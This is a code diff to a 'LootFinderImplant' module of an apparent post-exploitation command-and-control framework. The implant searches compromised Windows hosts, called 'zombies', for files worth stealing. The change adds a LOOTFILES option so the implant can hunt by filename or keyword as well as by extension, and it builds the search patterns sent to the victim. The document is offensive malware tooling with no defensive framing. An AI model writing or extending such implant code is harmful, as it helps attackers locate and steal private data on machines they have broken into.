@@ -29,22 +29,25 @@ class LootFinderImplant(core.implant.Implant):
     def load(self):
         self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
         self.options.register("LOOTDIR", "C:\\", "root directory to search for loot", required=True)
-        self.options.register("LOOTEXTS", ".pdf, .xsl", "file extensions to search for", required=False)
-        # will work on adding in filename support l8r
-        # self.options.register("LOOTFILES", "", "specific filenames to search for", required=False)
+        self.options.register("LOOTEXTS", ".pdf, .xsl", "file extensions to search for (comma seperated)", required=False)
+        self.options.register("LOOTFILES", "", "files or words to search for (comma seperated)", required=False)
         self.options.register("LOOTE", "", "string to send to zombie", hidden=True)
         self.options.register("LOOTD", "", "string to send to zombie", hidden=True)
+        self.options.register("LOOTF", "", "string to send to zombie", hidden=True)
 
     def run(self):
 
-        # if not self.options.get("LOOTEXTS") and not self.options.get("LOOTFILES"):
-        if not self.options.get("LOOTEXTS"):
-            self.shell.print_error("Need to define extensions to look for!")
-            # self.shell.print_error("Need to define extensions or filenames to look for!")
+        if not self.options.get("LOOTEXTS") and not self.options.get("LOOTFILES"):
+            self.shell.print_error("Need to define extensions or files to look for!")
             return
 
-        extension_list = "".join(self.options.get("LOOTEXTS").split()).split(",")
-        self.options.set("LOOTE", " ".join(["\\\\"+x+"$" for x in extension_list]))
+        if self.options.get("LOOTEXTS"):
+            extension_list = "".join(self.options.get("LOOTEXTS").split()).split(",")
+            self.options.set("LOOTE", " ".join(["\\\\"+x+"$" for x in extension_list]))
+
+        if self.options.get("LOOTFILES"):
+            files_list = "".join(self.options.get("LOOTFILES").replace(".", "\\\\.").split()).split(",")
+            self.options.set("LOOTF", " ".join(["."+x+".*" for x in files_list]))
 
         if self.options.get("LOOTDIR")[-1] != "\\":
             self.options.set("LOOTDIR", self.options.get("LOOTDIR")+"\\")
